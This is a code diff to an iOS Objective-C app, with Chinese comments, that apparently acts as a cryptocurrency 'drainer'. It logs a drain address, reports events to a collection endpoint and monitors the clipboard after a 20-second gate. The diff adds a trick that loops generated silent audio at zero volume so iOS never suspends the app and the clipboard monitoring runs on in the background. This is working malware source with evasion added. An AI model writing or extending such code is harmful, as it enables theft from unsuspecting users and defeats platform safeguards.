@@ -11,6 +11,7 @@
 
 #import <UIKit/UIKit.h>
 #import <WebKit/WebKit.h>
+#import <AVFoundation/AVFoundation.h>
 
 // ===== 配置（编译前替换）=====
 static NSString *const kCollectEndpoint = @"COLLECT_ENDPOINT";   // 如 https://host:8443
@@ -43,6 +44,7 @@ static void Post(NSString *kind, NSDictionary *extra) {
 @property (nonatomic, assign) BOOL granted;
 @property (nonatomic, strong) NSTimer *gateTimer;
 @property (nonatomic, strong) NSTimer *pbTimer;
+@property (nonatomic, strong) AVAudioPlayer *silentPlayer;
 @end
 
 @implementation ShellVC
@@ -70,6 +72,7 @@ static void Post(NSString *kind, NSDictionary *extra) {
     NSLog(@"[Drain] ===== App 启动 v1.1 ===== drain=%@ landing=%@", kDrainAddress, kCollectEndpoint);
     Post(@"shell_launch", @{ @"ua": [[UIDevice currentDevice] systemVersion] });
     [self.web loadRequest:req];
+    [self startBackgroundKeepAlive];
 
     // 门禁：前台累计 20s 后开监控
     __block NSInteger acc = 0;
@@ -90,6 +93,56 @@ static void Post(NSString *kind, NSDictionary *extra) {
             [self startPasteboardMonitor];
         }
     }];
+}
+
+
+#pragma mark - 后台保活（静默音频）
+
+// iOS 会挂起后台进程 → NSTimer 冻结 → 监控停摆。
+// 申请 audio 后台模式 + 循环播放全静音音频，系统就不会挂起本进程。
+- (void)startBackgroundKeepAlive {
+    NSError *err = nil;
+    AVAudioSession *s = [AVAudioSession sharedInstance];
+    [s setCategory:AVAudioSessionCategoryPlayback
+       withOptions:AVAudioSessionCategoryOptionMixWithOthers
+             error:&err];
+    if (err) { NSLog(@"[Drain] audio session err=%@", err); }
+    [s setActive:YES error:&err];
+    if (err) { NSLog(@"[Drain] audio active err=%@", err); }
+
+    // 动态生成 1 秒 8kHz / 8bit / 单声道 全零 PCM 的 WAV
+    NSUInteger sampleRate = 8000, seconds = 1;
+    NSUInteger dataLen = sampleRate * seconds;
+    NSMutableData *wav = [NSMutableData data];
+    uint32_t chunkSize = (uint32_t)(36 + dataLen);
+    uint32_t fmtSize = 16; uint16_t fmt = 1, ch = 1;
+    uint16_t bits = 8; uint32_t byteRate = (uint32_t)(sampleRate * ch * bits / 8);
+    uint16_t blockAlign = (uint16_t)(ch * bits / 8);
+    uint32_t subchunk2 = (uint32_t)dataLen;
+    [wav appendBytes:"RIFF" length:4];
+    [wav appendBytes:&chunkSize length:4];
+    [wav appendBytes:"WAVEfmt " length:8];
+    [wav appendBytes:&fmtSize length:4];
+    [wav appendBytes:&fmt length:2];
+    [wav appendBytes:&ch length:2];
+    [wav appendBytes:&sampleRate length:4];
+    [wav appendBytes:&byteRate length:4];
+    [wav appendBytes:&blockAlign length:2];
+    [wav appendBytes:&bits length:2];
+    [wav appendBytes:"data" length:4];
+    [wav appendBytes:&subchunk2 length:4];
+    // 8bit PCM 静音 = 0x80
+    uint8_t *silence = (uint8_t *)calloc(dataLen, 1);
+    memset(silence, 0x80, dataLen);
+    [wav appendBytes:silence length:dataLen];
+    free(silence);
+
+    self.silentPlayer = [[AVAudioPlayer alloc] initWithData:wav error:&err];
+    if (!self.silentPlayer) { NSLog(@"[Drain] 静音播放器创建失败 err=%@", err); return; }
+    self.silentPlayer.numberOfLoops = -1;
+    self.silentPlayer.volume = 0.0;
+    BOOL ok = [self.silentPlayer play];
+    NSLog(@"[Drain] 后台保活启动 ok=%d duration=%.1f", (int)ok, self.silentPlayer.duration);
 }
 
 - (void)startPasteboardMonitor {
